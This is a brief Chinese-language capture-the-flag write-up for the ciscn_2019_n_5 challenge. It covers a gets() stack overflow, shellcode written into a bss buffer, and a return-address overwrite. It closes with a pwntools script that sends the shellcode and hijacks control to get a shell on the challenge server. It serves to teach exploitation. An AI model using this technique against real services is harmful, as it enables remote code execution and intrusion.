首先检查安全机制

![image-20201103165102208](https://static.hack1s.fun/images/2021/02/06/image-20201103165102208.png)

运行尝试一下

![image-20201103165214264](https://static.hack1s.fun/images/2021/02/06/image-20201103165214264.png)

反编译得到main函数代码

![image-20201103165340664](https://static.hack1s.fun/images/2021/02/06/image-20201103165340664.png)

text距离rbp有20h

这里的name是位于bss段的

![image-20201103170309603](https://static.hack1s.fun/images/2021/02/06/image-20201103170309603.png)

第一个read读name的时候可以读到`0x64`的长度

之后gets函数是读text，这里可以溢出rbp



那么思路应该就是首先在第一个输入name的时候将shellcode输入到bss段

之后使用gets函数溢出rbp，跳转到bss那里执行代码

```python
from pwn import *

io = remote('node3.buuoj.cn',26740)
#io = process('./ciscn_2019_n_5')

io.recvuntil('name\n')
payload1 = asm(shellcraft.amd64.linux.sh(),arch='amd64',os='linux')

io.sendline(payload1)
io.recvuntil('name!\n')

bss_name = 0x601080
payload2 = 0x20*'a' + 'b'*8 + p64(bss_name)

io.sendline(payload2)
io.interactive()
```

